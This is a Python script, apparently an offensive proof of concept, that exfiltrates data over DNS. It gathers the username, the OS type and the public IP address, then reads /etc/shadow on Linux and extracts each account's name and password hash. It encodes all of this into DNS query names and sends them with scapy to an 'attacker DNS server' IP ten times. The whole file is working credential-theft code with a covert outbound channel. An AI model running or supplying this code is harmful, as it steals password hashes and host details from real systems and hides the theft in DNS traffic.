#!/usr/bin/env python3

import getpass
from requests import get
import os
from scapy.all import DNS, DNSQR, IP, UDP, send

# IP of attacker DNS server
# Change this IP to your local IP if you want to test it on the local network.
dst_ip = "8.8.8.8" 

if os.name == "nt":
    windows = True
    linux = False
else:
    windows = False
    linux = True


username = getpass.getuser()
print("Username: " + username)

ip = get('https://api.ipify.org').text
print('My public IP address is:', ip)

dns_queries = DNSQR(qname="Linux: "+str(linux))
dns_queries = dns_queries / DNSQR(qname="Windows: "+str(windows))
dns_queries = dns_queries / DNSQR(qname="Username: "+str(username))
dns_queries = dns_queries / DNSQR(qname="IP: "+str(ip))

if linux:
    shadow_file_path = "/etc/shadow"
    with open(shadow_file_path) as file:
        i = 0
        for line in file.readlines():
            i = i + 1
            line = str(line.rstrip())

            inde = line.find(":") 
            inde2 = line.find(":", inde+1)
            shadow_user = line[0:inde]
            print("Shadow User #" + str(i) + ": " + shadow_user)
            shadow_password = line[inde+1:inde2]
            print("Shadow Password: " + shadow_password)

            my_query = str(shadow_user) + "." + str(shadow_password) + ".com"

            dns_queries = dns_queries / DNSQR(qname=my_query)
        
print("Total " + str(i) + " users on the system")
dns_req = IP(dst=dst_ip) / UDP(dport=53) / DNS(qd=dns_queries)
#dns_req.show()
send(dns_req, count=10)